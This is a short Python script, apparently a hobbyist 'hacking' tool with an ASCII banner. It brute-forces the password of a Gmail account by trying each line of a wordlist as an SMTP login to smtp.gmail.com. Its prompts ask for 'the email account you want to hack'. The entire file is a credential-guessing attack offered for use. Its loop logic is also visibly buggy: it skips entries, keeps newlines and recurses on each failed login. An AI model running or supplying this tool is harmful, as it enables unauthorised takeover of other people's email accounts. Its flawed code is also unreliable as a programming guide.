# import modules
import smtplib

print("""
 █████╗  ██████╗ ██████╗███████╗███████╗███████╗     ██████╗ ██████╗  █████╗ ███╗   ██╗████████╗███████╗██████╗ 
██╔══██╗██╔════╝██╔════╝██╔════╝██╔════╝██╔════╝    ██╔════╝ ██╔══██╗██╔══██╗████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
███████║██║     ██║     ███████╗█████╗  ███████╗    ██║  ███╗██████╔╝███████║██╔██╗ ██║   ██║   █████╗  ██║  ██║
██╔══██║██║     ██║     ╚════██║██╔══╝  ╚════██║    ██║   ██║██╔══██╗██╔══██║██║╚██╗██║   ██║   ██╔══╝  ██║  ██║
██║  ██║╚██████╗╚██████╗███████║███████╗███████║    ╚██████╔╝██║  ██║██║  ██║██║ ╚████║   ██║   ███████╗██████╔╝
╚═╝  ╚═╝ ╚═════╝ ╚═════╝╚══════╝╚══════╝╚══════╝     ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═════╝ 

Gmail version
By dsxz19-2
Copywrite dsxz19-
""")

# start gmail server
s = smtplib.SMTP('smtp.gmail.com', 587)
s.starttls()

# define variables
username = input("[+] Enter the email account you want to hack: ")
file = input("[+] Name the file with the passwords (make sure it is in the same directory): ")

# set dependancies
count = 0
f = open(file)

def main():
        try:
            for i in range(1):
                count = 0
                for x, line in enumerate(f):
                        count = count + x
                        if x == count:
                            #print("[+] Trying password: " + line)
                            s.login(username, line)
                            count = count + 1
                            if s.auth_login():
                                print("[+] Password found: " + line)
                                break
        except smtplib.SMTPAuthenticationError:
            #print("[-] Password " +line+ " failed")
            main()
main()
